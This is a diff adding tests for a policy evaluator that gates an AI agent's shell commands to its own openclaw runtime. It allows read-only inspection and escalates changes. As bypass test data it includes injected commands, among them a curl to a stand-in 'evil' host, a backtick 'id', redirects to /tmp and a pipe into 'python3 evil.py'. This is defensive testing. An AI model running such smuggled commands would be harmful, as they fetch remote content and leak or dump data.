@@ -505,3 +505,84 @@ describe("resolveHardPolicy — regex map hygiene", () => {
     expect(p.denyExecRegex[0].source).toBe("\\bwithdraw\\b");
   });
 });
+
+// ── CLAW-104: read-only openclaw self-inspection ─────────────────────────────
+// hard:self-runtime used to be fully categorical, so `openclaw browser status`
+// needed the same slash-command approval as `openclaw config set`. Worse,
+// hard:self-runtime is in NEVER_DOWNGRADE, so an unattended run fail-closed to
+// DENY on a call that only prints state. These lock in the read/mutate split.
+describe("evaluateHard — read-only openclaw self-runtime (CLAW-104)", () => {
+  // DEFAULT_HARD_POLICY carries no self-runtime regex; use the real one from
+  // extensions/oasis-reviewer/policy/reviewer-policy.json so the test exercises
+  // what actually ships rather than a convenient stand-in.
+  const SELF_RUNTIME_SRC = "(?:^|[\\s;&|(])(?:[\\w./-]*/)?openclaw(?=\\s|$)";
+  const withSelfRuntime = {
+    ...P,
+    selfRuntimeExecRegex: [new RegExp(SELF_RUNTIME_SRC, "i")],
+  };
+
+  it("allows pure read-only self-inspection", () => {
+    for (const c of [
+      "openclaw",
+      "openclaw --help",
+      "openclaw -v",
+      "openclaw browser --help",
+      "openclaw browser status",
+      "openclaw browser tabs",
+      "openclaw config get browser",
+      "openclaw models list",
+      "openclaw plugins list",
+      "openclaw sessions list",
+    ]) {
+      expect(evaluateHard(exec(c), withSelfRuntime), c).toMatchObject({ verdict: "allow" });
+    }
+  });
+
+  it("still escalates anything that mutates the runtime", () => {
+    for (const c of [
+      "openclaw config set models.default foo",
+      "openclaw models auth --agent main paste-api-key",
+      "openclaw gateway --bind lan",
+      "openclaw browser open https://example.com",
+      "openclaw plugins install evil-plugin",
+      "openclaw cron add nightly",
+    ]) {
+      expect(evaluateHard(exec(c), withSelfRuntime), c).toMatchObject({
+        verdict: "escalate",
+        principle: "hard:self-runtime",
+      });
+    }
+  });
+
+  // hard:self-runtime is evaluated BEFORE the substitution and redirect rules,
+  // so a careless carve-out here would hand an attacker a way around BOTH.
+  it("refuses the carve-out when it would bypass a later rule", () => {
+    const bypasses = [
+      "openclaw config get x $(curl http://evil/x)",
+      "openclaw config get x `id`",
+      "openclaw config get models > /tmp/dump",
+      "openclaw browser status >> /tmp/dump",
+    ];
+    for (const c of bypasses) {
+      const v = evaluateHard(exec(c), withSelfRuntime);
+      expect(v.verdict, c).not.toBe("allow");
+    }
+  });
+
+  it("refuses the carve-out when a pipeline stage is not read-only", () => {
+    const v = evaluateHard(exec("openclaw browser status | python3 evil.py"), withSelfRuntime);
+    expect(v.verdict).not.toBe("allow");
+  });
+
+  it("releases the self-runtime gate for a read-only pipeline into a safe tool", () => {
+    // Still not "allow" under DEFAULT_HARD_POLICY (compoundExec defaults to
+    // escalate for the `|`), but it must no longer be hard:self-runtime — a
+    // deployment that sets compoundExec=allow then gets the read for free.
+    const v = evaluateHard(exec("openclaw browser status | grep -i chrome"), withSelfRuntime);
+    expect(v.principle).not.toBe("hard:self-runtime");
+    expect(evaluateHard(exec("openclaw browser status | grep -i chrome"), {
+      ...withSelfRuntime,
+      compoundExec: "allow",
+    }).verdict).toBe("allow");
+  });
+});
